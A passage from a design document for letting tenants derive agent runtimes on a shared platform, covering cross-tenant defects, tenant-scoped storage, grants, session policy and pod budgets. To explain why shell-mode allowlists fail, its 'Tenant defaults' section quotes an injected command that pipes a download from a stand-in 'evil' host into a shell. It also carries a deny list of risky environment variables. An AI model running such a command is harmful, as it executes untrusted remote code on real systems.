- DP9. A platform write to a base or a template pool succeeds regardless of what tenant-derived runtimes exist. The exceptions are `DELETE .../tenant-access/{tenantId}` and a template's `DELETE`, which the operator's own live grant entry refuses, a base's `DELETE` before its retirement date, which an emergency retirement gets past, and a write that raises the setup bound past a pool's window. A base write that raises `setupPolicy.timeoutSeconds`, or a template write that raises a pool's fetch retry window, is refused when any pool, platform or tenant-owned, would no longer fit its window, and the refusal names those pools and the smallest `gateway.maxFinalizingTimeoutSeconds` at which they fit (decision 40).
- DP10. Each write passes through the single write path for tenant opt-ins that [EG-9](../0127-egress-and-git/steps.md#steps) (egress policy objects) adds, applies any guardrail of the tenant security record ([SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)), and records the content it changes.
- DP12. A default clone stores no credential. Its token comes from the tenant's VCS pool or the session user's link, under the checks a client's `gitClone` source gets, and those checks run on every path that composes it.
- DP13. A reservation never evicts a pod, and the total reservable capacity is set only through Helm.
- DP14. A warm store holds only a repository on its pool's warm list. On an owned pool that list holds the runtime's `gitRepository` assets and the base's public operator entries. A session reaches a tenant's or a private store only after passing that repository's read checks, and on a pod that serves one session a store whose checks it fails is deleted before anything runs for it. On a pool that reuses pods, a repository later removed from the runtime stays readable on occupied pods until they retire, as "Who reaches a store" under DR-9 states.
- DP15. A default clone adds a repository to a session's writable set only under a stated `write` value. A value that needs no client statement also needs a platform grant and confines pushes to a named ref namespace, and a delegated child never gets write access its parent lacks.

### Shared records today

A `tenant-admin` updating a platform-global record its tenant holds an access row on affects every other tenant holding an access row on it.

`PUT /v1/admin/runtimes/{name}` checks only that the caller's tenant holds an access row. `applyRuntimeUpdate` then writes `workspaceDefaults`, `labels`, `setupCommandPolicy`, `delegationPolicyRef`, `publishedMetadata`, `sessionPolicy`, `limits`, `isolationProfile`, and `capabilities`. `runtimes.go` contains no role check. §14.1 **Runtime workspace defaults.** composes the runtime's `workspaceDefaults` into every session's plan, and §7.5 **Command policy:** exempts those commands from `setupCommandPolicy`. An administrator of tenant `acme` can therefore place a command that runs in a session of tenant `globex`. The RuntimeReconciler rewrites the CRD-owned fields at its next reconcile, and its field list omits `workspaceDefaults`, `publishedMetadata`, `sessionPolicy`, and `sharedAssets`, so those writes persist on a CRD-registered runtime too.

The pool routes have the same gate. F-5.2.67 records the egress case. The same gate also lets one tenant re-point `runtimeRef`, change `isolationProfile`, set the warm count, and drain a shared pool, which refuses new sessions for every tenant on it.

## Costs of the capability

The owner has decided to have this capability. These are its costs.

- **Tenant code in every session.** Any tenant default is code execution at the slot UID, in every session on that runtime, and the user creating the session has no opt-out. A default file is code as well as a command: a base command installs from it, and a runtime loads a hook or configuration file from the workspace. A stolen `tenant-admin` therefore reaches what [`0151-user-credential-delivery`](../0151-user-credential-delivery/change.md) lists for this attacker: it reads a `file` token and uses an `inject` token, including a host's mint operation. It also reads what later sessions place in the workspace. A grant with `allowWorkspaceFiles`, `allowSetupCommands`, and `allowGitClones` off carries none of this cost and still serves R2. DF-1 is worse than this today, because it crosses tenants, and DR-1 closes it. Within a tenant the risk is new.
- **Warm pods per runtime.** Each tenant-derived runtime has its own pool and at least one warm pod, because a pool has no working cold path today (DF-11). An environment moved from a concurrent pod to one-session pods also uses more pods per session.
- **Capacity planned by customers.** §17.8.2's sizing assumes an operator's pool list. Tenant writes now add pools within the budgets, and the namespace `ResourceQuota` is shared.
- **Slower base retirement.** A base with tenant-derived runtimes takes a notice period to retire, apart from the emergency path, and a platform change reaches runtimes the operator did not write.
- **A wider read path.** Every session-path read of a runtime changes to take a tenant, across `pkg/gateway/sessionserver`, `pkg/gateway/mcpfabric`, `pkg/gateway/session`, and `cmd/lenny-gateway`, and each holder of the plain runtime store interface changes type. The compiler finds those sites. Many of them continue on a not-found answer today, so the change is needed for correctness as well as isolation (see "Reading").
- **Operating load.** Tenant-chosen runtime and pool names appear in operator logs and in metric labels, which raises label cardinality, and an operator debugging a failed pod now reads tenant configuration.
- **Prerequisite work.** DR-1, DR-2, and DR-3 close defects this capability cannot rest on. DF-3 and DF-5 mean no derived runtime runs a session today, so the way [`0149-tenant-scoping-identity` decision 15](../0149-tenant-scoping-identity/decisions.md#decisions) gives needs DR-2 whoever creates the runtime.

## Detailed design

### DR-1 to DR-3: Prerequisites

**DR-1, the shared-record boundary.** R3 and R4 need a base that no tenant can change. A `tenant-admin` loses every write on a platform-global runtime or pool, including the pool's `warm-count`, `drain`, `circuit-breaker`, `bootstrap-override`, and `resume-reconciliation` routes. `PermManageRuntimes` and `PermManagePools` leave `RolePermissions(RoleTenantAdmin)`, which is what `TenantAdminPermissions()` returns and what the custom-role ceiling reads, so a custom role cannot hold them either. `AllPermissions()` keeps them for `platform-admin`. Reads stay. [EG-9](../0127-egress-and-git/steps.md#steps)'s tenant pool overlay remains the path for egress and git settings, and a derived runtime is the path for the rest. DR-1 also moves session create, discovery, and delegation to read `runtime_tenant_access`, and reserves the `--` name form. On a resolution with no pool pin, a pool with a pool row in `pools` and no owner needs a `pool_tenant_access` row, an owned pool checks its owner, and a CRD-only pool such as `echo-pool-embedded` is exempt, because the foreign key on `pool_tenant_access` refuses it. A soft-deleted row counts as a pool row, and a read error refuses. A miss answers as no matching pool. The check runs at the post-chain point of [RT-2](../0141-runtime-routing/change.md#post-chain-point), on the final pool, only where a create, derive, or child placement claims a pod, so a revocation does not fail `/start` for a session already holding a claim or lose slot accounting in `startOnPod`, `launchOnPod`, `resumeOnPod`, and `accountFailedSlot`.

Those reads refuse every session on a fresh install unless the bootstrap seed writes access rows, and it does not (DF-14). DR-1 therefore implements §17.6's `tenantAccess` on seeded runtimes and pools. An absent `tenantAccess` gives access to `default` when the seed names no tenant, which is the chart's default `bootstrap.tenants: []`, the seed's tenant when it names exactly one, and none when it names several (this design's decision 15). The chart and the handler take a `tenants` list, so several is a normal value, and §17.6's singular `tenant` is stale (DF-19). The `lenny-bootstrap` Job also runs post-upgrade, so a list or default applies only when the seed creates the row, as §17.6's "left unchanged" states, which keeps `helm upgrade` from undoing a revocation. `--force-update` adds the tenants of a listed `tenantAccess`, removes no access row, logs a `WARN` naming each existing access row the list omits, and never applies the default, which narrows §17.6 item 5's full replacement for this field. A seed naming several tenants that leaves a runtime or pool with no access logs a `WARN` naming it, because a session there otherwise reports only that no pool matches.

[`0141-runtime-routing`](../0141-runtime-routing/change.md) removes experiments and their pool effects ([RT-1](../0141-runtime-routing/change.md#rt-1-removal)), which closes the experiment path of DF-9. Runtime routes replace them. A route writes no pool configuration, and its admission refuses a target outside the tenant view and a pool the tenant cannot select ([RT-4](../0141-runtime-routing/change.md#rt-4-runtime-routes)), so a route reaches no pool another tenant uses. DR-8's "Runtime routes" states how routes meet tenant-derived runtimes.

**DR-2, pods for derived runtimes.** `podRuntimeRef` is under "Pods". §5.1 changes to state that a derived runtime needs its own pool, removes the fallback sentence, and states that `sessionPolicy` on a derived runtime supplies the values of its pool. A platform-created derived runtime follows the same rule, so this fixes the way [`0149-tenant-scoping-identity` decision 15](../0149-tenant-scoping-identity/decisions.md#decisions) gives for an operator on its own.

**DR-3, setup command identity.** The adapter asks the slot's runtime supervisor over `CH-SUPERVISE` to run each setup command in a forked worker at the slot UID, through the `setup` request of [SI-3](../0145-session-isolation/change.md#si-3-runtime-processes-slot-release-and-setup-commands), with output on log pipes as the materialization design states. Commands then run from the runtime image, with the agent's access. A client's commands get the same change. Every slot container of every agent pod runs the supervisor ([PL-1](../0118-agent-pod-layout/change.md#pl-1-pod-blueprint)), so no base is refused a tenant default for want of one. DR-3's claim is limited to the adapter's identity: the token and the writable volume go out of reach. Under session isolation each slot has its own UID and its own run volume, so a slot reads only its own credential file at `/run/lenny/credentials.json` ([SI-7](../0145-session-isolation/change.md#si-7-credentials-manifests-and-other-shared-files)).

### DR-4: Tenant runtime records

#### Options

| Option | Result |
| :-- | :-- |
| A nullable `owner_tenant_id` on `runtime_definitions` | Existing reads keep working unchanged, and each one would return another tenant's row unless it adds a check. DF-2 shows how application-layer filtering on this record has fared. It also fails `lenny_tenant_guard` and §12.3's R-01, which requires `tenant_id` to lead the primary index, or every composite index on a high-frequency query path, of a tenant-scoped table. |
| A composite key `(tenant_id, name)` on one table | It rewrites the table, its foreign keys, and the platform rows, and it leaves two tenants with one name, which conflicts with the pod label, the CRD names, and pool lookup by name. |
| **A separate tenant-scoped table, with a reserved name prefix per tenant (recommended)** | A query with no tenant context cannot see a tenant row, so a missed read leaks nothing. "Reading" states why that alone is not enough. Every name stays globally unique, so session rows, pod labels, CRDs, and metrics keep one string. |

#### Stored format

`tenant_runtime_definitions` holds the columns of `runtime_definitions` plus `tenant_id`, with `(tenant_id, name)` as primary key and a unique index on `name`. It takes `lenny_tenant_guard` and `lenny_tenant_isolation`, as migration `0054` did for delegation policies, so §4.2's statement that a missing WHERE clause cannot break isolation holds. Reads go through `pgtenant.InTx` with the tenant, and platform reads go through `pgtenant.InAllTenants`. §4.2's classification table gains a tenant-scoped row, and the platform-global row stays for platform records. §12.8 erasure gains this table, the grant, and owned pools. See "Tenant suspension and deletion".

#### Names

The platform assigns each granted tenant a `namePrefix`, unique across tenants and immutable once the tenant has a row. A tenant-derived runtime is named `<namePrefix>--<suffix>`, such as `acme--chat-payments`.

- A prefix matches `^[a-z0-9]+(-[a-z0-9]+)*$`, so it holds no `--` and does not end in `-`. A name therefore has one prefix, read up to its first `--`. Without this, `a--b--x` fits the prefixes `a` and `a--b`.
- `consumed_name_prefixes` records each prefix when first assigned, and neither withdrawal nor erasure removes it, so a later tenant cannot take a name that retained records still carry.
- `--` becomes reserved. The admin API, the bootstrap seed, and the RuntimeReconciler refuse a platform runtime or pool name containing it. Nothing is deployed, so nothing migrates.
- A tenant's write naming another prefix is refused with `422 INVALID_DERIVED_RUNTIME`, so `RESOURCE_ALREADY_EXISTS` can only report the tenant's own name and is no oracle.
- The whole name is at most 63 characters, because `createPod` copies it to the `lenny.dev/runtime` pod label (DF-10).
- A deleted name stays consumed, as [`0127-egress-and-git`](../0127-egress-and-git/change.md) states for pools, and only the tenant's own names are consumed. Creates are rate-limited, and soft-deleted rows count toward a separate bound.

#### Reading

`runtimestore` gains a tenant view, `Resolve(ctx, tenantID, name)` and `List(ctx, tenantID)`. A name containing `--` reads only the tenant table, in that tenant's context. Any other name reads the platform table and requires a `runtime_tenant_access` row. `List` returns the platform rows the tenant holds access rows on, plus the tenant's own rows. It also evaluates the grant entry on each resolve (see "Base changes"). This is also what closes DF-2.

Row-level security stops a leak and does not stop a wrong answer. A tenant-derived name read through the platform runtime store returns `ErrNotFound`, and many sites continue on that answer: `runtimeSetupPolicy` in `bind_request.go` keeps `shell` true, which loses `setupCommandPolicy.shell: false`; `enforceSetupCommandPolicy` and §14.1 **Runtime workspace defaults.** rule 4, under which a session whose runtime has no registry entry binds its plan without defaults, bind the plan unchecked with no defaults; `requireExplicitEnvironmentAdmission` leaves the name to later checks; and the limits, idle, content-policy, and manifest reads in `envelope.go`, `sessionage`, `sessionidle`, `delegation/service.go`, and `mcptools_register.go` fall back to defaults. These rules follow.

- `Server`, `mcptools.Deps`, the delegation service, the session resolvers, and `credentialsurface.go` in `cmd/lenny-gateway` hold the tenant-view interface and no plain `Store`, so a missed site does not compile. `runtimecapoverride.ResolveForTenant` takes the view as well.
- `Store.Get` on a name containing `--` returns `ErrTenantScopedName`, distinct from `ErrNotFound`, and no path continues on it.
- A tenant-view miss on the final row refuses the request, on any name, at create, derive, and a delegated child's placement. The check runs at the post-chain point of [RT-2](../0141-runtime-routing/change.md#post-chain-point), after the `PreRoute` chain, the §4.8 gateway interceptor phase that runs before runtime selection, so a runtime route or an interceptor that moves a session meets it. `ResolvePool` reads no runtime store, so without this a revoked access row still lands sessions. The answer is `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, for an absent name and for another tenant's name. §14.1 rule 4, which binds a plan without defaults for a runtime with no registry entry, does not apply where the tenant view is wired. On a create this check runs first, because `requireAdmissionRateLimit` calls `ResolvePool` before any runtime read.

**Registered rows.** At the same post-chain point, for every create, derive, and delegated child, the gateway refuses a session whose final runtime row is not `registered`, and for a platform-derived runtime it also requires the base's row to be `registered`, because the pods are built from the base's `Runtime` resource. The answer is the one for an unknown runtime: `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, which is `TARGET_NOT_IN_SCOPE` for a delegated child. The owner settled this check on 2026-11-13 as AR O8 (b), "yes to all the others", and it replaces session derive's SD-P4 and its `target_unsupervised` reason and this design's former export refusal on an unsupervised target ([`0119-agent-runtimes-only`, "Decisions"](../0119-agent-runtimes-only/decisions.md#decisions)). The reason is the stale row, which every path can reach: the RuntimeReconciler's `mirror` refuses a `Runtime` resource whose `Registered` condition is false and leaves the row as it was, so the row would otherwise describe a resource the controller no longer accepts. The RuntimeReconciler records the condition in `registered` on the row, and the admin API writes `true` on a row it registers with no `Runtime` resource. The check reads the live row and no revision, because `registered` is no field of the `Runtime` resource that a revision copies. A tenant-derived runtime meets the same fact through its base: a base at `Registered=False` reads as `incompatible` under "Base changes", and new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`. A resume reads the session's stored runtime and is not refused here, so a running session survives a later refusal of its resource.

`GET /v1/runtimes/{name}/meta/{key}` has no principal, so a `--` name always answers not found there.

`Router` holds the tenant view too, and its plain `Store` moves to a field that only `requireAdmin` routes use. A handler only `platform-admin` reaches reads a view seeing both tables, through `pgtenant.InAllTenants`, wherever it reads a pool's runtime. Without that, `validatePoolUpdate` answers `400` for an owned pool on every `PUT` and on `warm-count`, which delegates to it, and `runtimeRestartable` reads false.

A handler a `tenant-admin` reaches reads the tenant view for one tenant and never the all-tenants view. These are `delegationPolicyRuntimeDependents`, `handleEnvironmentRuntimeExposure`, `environmentDryRunPreview`, route admission under [RT-4](../0141-runtime-routing/change.md#rt-4-runtime-routes), and the capability override `PUT`, which otherwise answers `404` for the tenant's own derived runtime. Two of them need more than a type change:

- The policy guard takes the policy's tenant. Migration `0054` keys policies on `(tenant_id, name)`, so names collide across tenants. Read across tenants, a `globex` admin deleting `strict` would get `409` naming `acme--chat-payments`, and `acme` would block that delete (DF-13).
- Route admission reads each target through the tenant view, and a miss refuses the write, so a route cannot name another tenant's derived runtime.

### Who turns it on

The capability needs a grant per tenant, in the form of [EG-9](../0127-egress-and-git/steps.md#steps)'s per-class gates, with parameters. The class is `tenantDerivedRuntimes`, and a tenant with no grant answers `403 DERIVATION_NOT_GRANTED`. A Helm value, `runtimes.tenantDerivation.enabled`, is false by default. While false it refuses a new grant, any write that raises a limit or adds a base, flag, or overlay, and `POST /v1/admin/derived-runtimes`. A withdrawal or a narrowing still passes, and existing runtimes keep resolving, so turning it off stops new use and is not an emergency stop.

```yaml
# PUT /v1/admin/tenants/{id}/derivation-grant
namePrefix: acme
maxRuntimes: 10
maxOwnedPods: 20
maxAssetUploadBytes: 1073741824
bases:
  - baseRuntime: chat
    templatePool: chat-shared
    resourceClasses: [small, medium]
    allowWorkspaceFiles: false
    allowSetupCommands: false
    allowGitClones: false
    allowGitCloneWrites: false
    allowAssets: false
    maxWarmCloneBytes: 0
    maxDefaultGitClones: 8
    maxPrestageTimeoutSeconds: 900
    maxReservedPods: {}
    ownedOverlays: []
```

A base entry is accepted only when all of these hold. A condition on a field that [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) versions, such as `requireSoPeercred`, holds for every revision in the base's traffic, because any of them can serve the next session ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). A new base revision that breaks one is evaluated as "Base changes" states.

- The base is a standalone runtime.
- The tenant holds `runtime_tenant_access` on it.
- `templatePool` is a platform pool backed by the base, and the tenant holds `pool_tenant_access` on it.
- `resourceClasses` lies within the base's `allowedResourceClasses`.
- The base has `requireSoPeercred` true, which keeps the `SO_PEERCRED` check on the boundary between the adapter and the agent. A base with `false` runs in nonce-only mode, which a pool admits only with `acknowledgeNonceOnlyAuth`, a deployer's statement that a tenant does not make.
- The base's `Runtime` resource exists, which the gateway's `get` permission reads, because a pool's pods need it (DF-3).
- With `allowSetupCommands` set, the base's `setupCommandPolicy` has mode `allowlist` and `shell: false`.
- With `allowGitCloneWrites` set, `allowGitClones` is set.
- With `maxWarmCloneBytes` above zero, the value is at or below `runtimes.tenantDerivation.warmClones.maxBytesPerPod` and the template's fetch size cap, the bytes one git fetch may transfer. A base carries public `gitRepository` entries alone (decision 32), so a grant entry no longer depends on what the base's entries hold.
- `maxDefaultGitClones`, when set, is at least 0 and at most `runtimes.tenantDerivation.maxDefaultGitClonesCeiling`, 32 by default. An entry that omits it reads `runtimes.tenantDerivation.maxDefaultGitClones`, 8 by default. The value is the operator's cap for that tenant on each runtime derived from the base, as "Checks at write" under DR-9 states (decision 43).
- `maxPrestageTimeoutSeconds`, when set, is positive. An entry that omits it reads `adapter.prestageTimeoutSeconds`, 900 seconds by default. It bounds the `prestageTimeoutSeconds` of each runtime derived from the base, as "Fields" states (decision 43).

The grant's `maxAssetUploadBytes` limits the bytes of the tenant's stored artifact uploads across all its derived runtimes, as "Uploads" under "Tenant shared assets" states (decision 43). A grant that omits it reads `runtimes.tenantDerivation.maxAssetUploadBytes`, 1 GiB by default. No deployment ceiling bounds the grant's value, which the owner settled as decision 44.

A base outside the list cannot be derived from, and "Base changes" states what each grant change does. A grant or a withdrawal is a platform admin's write to a customer's configuration, so [SO-4a](../0142-security-oversight/change.md#so-4a-mirror-to-the-tenant-chain) mirrors it, as for the other gates.

#### `oneSessionPerPod` and `sessionPolicy`

Concurrency and recycling come from the template pool. A tenant has one choice over them, `oneSessionPerPod`, which the owner accepted in the words "makes sense, yes". An owned pool serves a runtime's sessions under one of two policies:

| `oneSessionPerPod` | Owned pool's `maxConcurrentSessionsPerPod` and recycling |
| :-- | :-- |
| `false`, the default | The template's, copied with its acknowledgments, `cleanupCommands`, and `cleanupTimeoutSeconds` under "Template copy". An owned pool has one tenant, and the tenant pin keeps every pod on it. |
| `true` | `maxConcurrentSessionsPerPod: 1` and no `recycle` block, on any template. The row carries no acknowledgment and no cleanup commands, because these values need no acknowledgment and no pool recycle scrub runs. |

Every acknowledgment is a deployer's statement and a tenant writes none, so a tenant can only move to the narrower policy. Three cases need it: an environment with its own policy on a concurrent base, a default clone with a `write` other than `none`, and a clone under a VCS pool with `userAuthorization: required`. A shared pod refuses each of them. It also serves a tenant whose security team does not want to rely on a best-effort pool recycle scrub between its users. A tenant wanting a template's one-session policy to hold after a template write sets the field, because a template widening otherwise reaches the owned pool.

The field is one-way. A `PUT` that omits it leaves it unchanged, and a `PUT` setting `false` on a row holding `true` answers `422 INVALID_DERIVED_RUNTIME`. The reason is the one under "One session per pod" in DR-9: a pod created for one session can hold a repository, a deny, or an egress or git route belonging to one environment, and the claim paths read the pool's current policy with no check on the pod. A tenant that needs the template's policy again creates a new runtime. When the field becomes `true`, bound sessions complete in place, served pods are refused and drain, and reserved holds end.

A tenant cannot set a value between 1 and the template's. Such a pod still applies no per-session policy, so it adds no isolation, and a platform admin can name another template. A `sessionPolicy` naming `maxConcurrentSessionsPerPod`, any acknowledgment, or any `recycle` field answers `422 INVALID_DERIVED_RUNTIME` with `details.field`. Raising concurrency stays refused for the reasons decision 3 records, restated under session isolation: concurrent slots have their own containers, UIDs, and `/tmp`, and still share the pod's network and IPC namespaces, its sandbox kernel under gVisor and Kata, its adapter and `netagent`, pod-wide eviction, and its CPU and memory ([SI-10](../0145-session-isolation/change.md#si-10-what-stays-shared)), the template's `acknowledgeSharedPod` was made for the template's value, a runtime is not known to tolerate more, and where `netagent` cannot attribute a connection to its slot a raised value moves more users onto E = ∅ pods. On an owned pool that recycles under its template, reuse holds only within the reserved hold, because `warmCount` sets `minWarm` and `maxWarm` equal, which makes §5.2's pinned idle bound zero.

`sessionPolicy` on a tenant-derived runtime holds the limits below, each checked against the template pool, whose row is what the gateway enforces. The owned row holds the lower of the template's value and the tenant's, with a zero first resolved to its platform default, and a template write recomputes it. A platform-derived runtime keeps the whole of §5.1's `sessionPolicy`.

| Field | Tenant | Rule |
| :-- | :-- | :-- |
| `cleanupCommands`, `cleanupTimeoutSeconds` | Refused | The slot release runs them through the slot's supervisor between two sessions ([SI-3](../0145-session-isolation/change.md#si-3-runtime-processes-slot-release-and-setup-commands)), so a tenant-written cleanup command would be code that runs after one user's session and before the next user's. `oneSessionPerPod: true` needs none. Adding them later is additive. |
| `maxSessionAgeSeconds`, `maxClientIdleSeconds`, `slotRetries` | Lower only | They bound how long the tenant holds capacity. |
| `onPoolExhausted`, `maxQueueWaitSeconds` | `reject`, or `queue` within the template's wait | The queue is gateway memory. |

#### Tenant defaults

The owner wants default files, setup commands, and git clones. Any of them is code execution at the slot UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag. DR-9 states the same for a clone, and "Tenant shared assets" under DR-9 states it for an `inline` or `artifact` asset under `/lenny/assets`, which a runtime or a base command can load, and for a `gitRepository` asset, whose staged tree a session adopts as its checkout.

Each kind needs its grant flag and DR-3 landed: `allowWorkspaceFiles` for default files, `allowSetupCommands` for default commands, `allowGitClones` for default clones and `tenant`-declared `gitRepository` assets, and `allowAssets` for `inline` and `artifact` assets. Every slot container of every agent pod runs the runtime supervisor ([PL-1](../0118-agent-pod-layout/change.md#pl-1-pod-blueprint)), so every base qualifies once DR-3 has landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). No flag is needed for R2.

Today's command exemption exists because an operator wrote `workspaceDefaults`. A tenant-written command gets no exemption. It counts toward `maxCommands` and is checked against the effective `setupCommandPolicy` at write and again when the plan binds, so a narrowed base policy takes effect. The effective policy must be `allowlist` with `shell: false`, because matching is a prefix on raw text: under a shell, `pip install x; curl https://evil | sh` matches `pip install`. A `blocklist` is not a security boundary, as §7.5 states, and a base with no policy checks nothing. Under `shell: false` an allowlist bounds the program and its arguments, and an allowed program can still run what it fetches. Base commands run first and cannot be removed, as the merge rule states.

### DR-5: Owned pools

#### A pool per runtime

Each tenant-derived runtime has exactly one owned pool, created in the same request and named the same. Its own pool is needed because concurrency and recycling live on the pool row (DF-6), so a one-session policy has no effect on a base's concurrent pods. §5.1's fallback to the base's pool stays unavailable for tenant-derived runtimes: it would place a session on pods with another policy, read another pool's warm inventory, and need a check the base's pool does not make. `ResolvePool` matches the derived name, so owned pools cause no ambiguity for the base. `PoolStoreBasePoolResolver` is unaffected for the same reason.

The copied columns live on the owned row, so `poolPolicyMirror`, admission, and the PoolScalingController read a complete pool with no new merge. A platform write to a template updates the copied columns of its owned pools in the same transaction and bumps each generation. A narrowing therefore reaches them, and the running pods change as any pool edit does today, on pods created afterwards. `ownerTenantId` is set at create and immutable, as [`0127-egress-and-git` decision 26](../0127-egress-and-git/decisions.md#decisions) states.

[EG-9](../0127-egress-and-git/steps.md#steps)'s table gives an owned pool more than a shared one: replacing the warm-up policy, turning on `gitAccess`, choosing `egressProfile`, adding a certificate authority (CA), and setting client proxy environment variables. A copied flag was set by an operator thinking of the shared column, where most of these rows have no effect, so a copied flag could open a CA, a proxy variable, or `gitAccess` the operator never considered. Hence `ownedOverlays`, empty by default. A listed `clientProfile` sets the variables named under "Tenant proxy variables" in [`0127-egress-and-git`, "Tenant pool overlays"](../0127-egress-and-git/change.md#tenant-pool-overlays) only on a pool with `egressProfile: internet` that runs no `netagent`, and it sets file templates on any pool as shared-pool overlays do, under the `verbatimClientFiles` constraint of [`0142-security-oversight`](../0142-security-oversight/change.md), as that design's client proxy profile row states. The variable list excludes `JAVA_TOOL_OPTIONS`, `NODE_OPTIONS`, `LD_PRELOAD`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT`. A write that adds or changes `caBundle` emits `pool.ca_bundle_changed` at once, and the security posture reports it.

A write that lowers a `tenantOverride` flag on a pool a grant entry names succeeds whatever overlays exist, on its owned pools and on the template itself. A base entry requires `pool_tenant_access` on the template, so a tenant holding that access row can write an overlay there at any time and would otherwise block the write. The extending part stops applying, and `runtime.base_changed` goes out, under "Notice". [EG-9](../0127-egress-and-git/steps.md#steps)'s refusal stays for a shared pool no grant entry names.

A row that reads `none` after an entry drops it, or a profile dropped from `tenantEgressProfiles`, stops the stored value with the same event. `caBundle`, `clientProfile`, `gitAccess`, and `egressProfile` are fixed at pod creation, so they stop on pods created afterwards, and the API reports them as pending, as [EG-9](../0127-egress-and-git/steps.md#steps) does. `warmUp` is read per decision, so it stops at the next decision and reads as the template's. A dropped `egressProfile` reverts to the template's, which can be wider than the tenant's choice, and the event names it.

#### Pods

`createPod` reads the `Runtime` resource by the `AgentPod`'s `spec.runtimeRef`, and a derived runtime has none. DR-2 adds `PodSet.spec.podRuntimeRef`, which the PoolScalingController sets from the pool row, and every read of the resource in the AgentPod controller keys on it. `runtimeRef` keeps the derived name for `ResolvePool` and the label. A base's `Runtime` resource therefore serves any number of derived pools, and no tenant input reaches a cluster-scoped resource.

Once [`0140-runtime-revisions`](../0140-runtime-revisions/change.md) lands, the pod builder reads the versioned fields from a revision rather than from the live `Runtime` resource, and an owned pool keeps one pod set, recorded as a `PodSet`, per active base revision ([RV-3](../0140-runtime-revisions/change.md#rv-3-pods)). On each `PodSet`, `spec.podRuntimeRef` names the base and `spec.runtimeRevision` names the base revision, and the pod set's pods are built from that revision with the derived runtime's fields merged over it ([RV-5](../0140-runtime-revisions/change.md#rv-5-derived-runtimes)). A pod set's key covers the base revision's pod hash together with the derived runtime's pod-affecting contribution, its `sharedAssets` append of `inline`, `artifact`, and `gitRepository` assets ([RV-3](../0140-runtime-revisions/change.md#rv-3-pods)). Placement reads no versioned field, so every pod set of the pool shares the pool's offering and node class ([PM-5](../0136-placement/change.md#pm-5-rendering)). Outside a base rollout and a change to those contributions the pool has one pod set.

Pods serve only the owner. The controller stamps `lenny.dev/tenant-id` with the owner at creation, as the "Tenant-owned pool" row of [`0127-egress-and-git`, "Pod models"](../0127-egress-and-git/change.md#pod-models) states, and egress decisions, warm-up additions, and egress groups then read one tenant from the first second. `requirePoolSelectable` and the claim path read the owner, so another tenant's pool pin fails as an unknown pool. The pool check runs at the post-chain point of [RT-2](../0141-runtime-routing/change.md#post-chain-point) on the final pool, so a runtime route target or an interceptor that names another tenant's owned pool fails the same way.

That stamp does not work against today's code, and the design has to resolve this. These readers treat a non-empty label as "this pod has served a session":

- `AdmitTenantPin` refuses and drains every labelled pod when the pool does not reuse pods, so a one-session owned pool would drain each warm pod at its first acquisition.
- `markPinnedIdle` and §5.2 **Pinned idle inventory.** keep labelled idle pods out of `minWarm` and, with `maxWarm` equal to the target, drain them. The pool would stay in `PoolWarmingUp`.

[EG-9](../0127-egress-and-git/steps.md#steps) adds `lenny.dev/served` at this design's request, as [`0127-egress-and-git`, "Pod models"](../0127-egress-and-git/change.md#pod-models) states, and the gateway stamps it at first assignment on an owned pool. DR-5 moves the readers to it. On an owned pool both readers read that label in place of the tenant label: an unserved pod is ordinary inventory, and a served pod is refused and drained on a non-recycling pool. Another tenant's request never reaches this check on an owned pool, and `AdmitTenantPin` keeps the tenant pin comparison as the second layer.

#### Bounds

| Bound | Holder | Enforcement |
| :-- | :-- | :-- |
| `maxRuntimes` | Grant | Checked at write, under a lock on the grant row, so concurrent creates cannot pass together. |
| `maxOwnedPods` | Grant | One figure governs every check. The tenant's charge T is the sum across its owned pools of `max(inUse, reservedPods) + warmCount + unusable`. `inUse` counts pods in `claimed` and `reserved`, `unusable` counts `draining` and `failed`, and `reservedPods` is 0 on a pool with no reservation. A pod whose `AgentPod` records its fill failure on a platform-declared warm-list entry, a base's public entry or a `gitRepository` asset that a `platform-admin` wrote on the runtime, counts in neither `unusable` nor any other term of T, because the tenant cannot fix that cause (decision 35). A write or a claim that raises T past the bound is refused: a write answers `422 DERIVATION_BUDGET_EXCEEDED`, under a lock on the grant row, and a claim answers `429 QUOTA_EXCEEDED`. A write lowering T always passes. A claim that leaves T unchanged always passes, which covers a claim within a reservation and a `ClaimSlot` on an occupied pod. `warmCount` stands for `idle` and `warming` pods, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. Counts come from an `AgentPod` list per owned pool. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. A pool with a non-empty `warm_stop_reasons` charges nothing for `warmCount` or `reservedPods`, and neither does any pool while reservations are off, for `reservedPods`. A session ending moves a pod to `unusable`, which can raise T with no check, and claims outside a reservation are then refused until that pod is gone. |
| `maxOwnedPods`, at creation | Grant | T decides what a tenant may ask for, and this rule bounds what runs. The PoolScalingController renders the bound on each owned `PodSet`, and the WarmPoolController creates no `AgentPod` in that pool while the owner's non-terminal `AgentPod` objects, listed by owner across all its pools, are at the bound. This covers a warm refill and a reservation's replacement alike. A lowering therefore frees budget at once while the pods it releases still count here, and a pool deleted while its pods drain still counts. A pod that a platform-declared entry failed still counts here under decision 38, because this bound limits what exists on the node and the backoff keeps such pods few. |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | Helm | The sum of every grant's `maxOwnedPods` stays at or below it, checked at grant write under one lock that only grant writes take. Preflight compares it with the namespace `ResourceQuota`. |
| Pod size | `resourceClasses` | Set per base in the grant. `LimitRange` still applies. |

`max_concurrent_sessions` does not serve as this bound. A quota of 1000 moved from 20-session pods to one-session pods turns 50 pods into 1000.

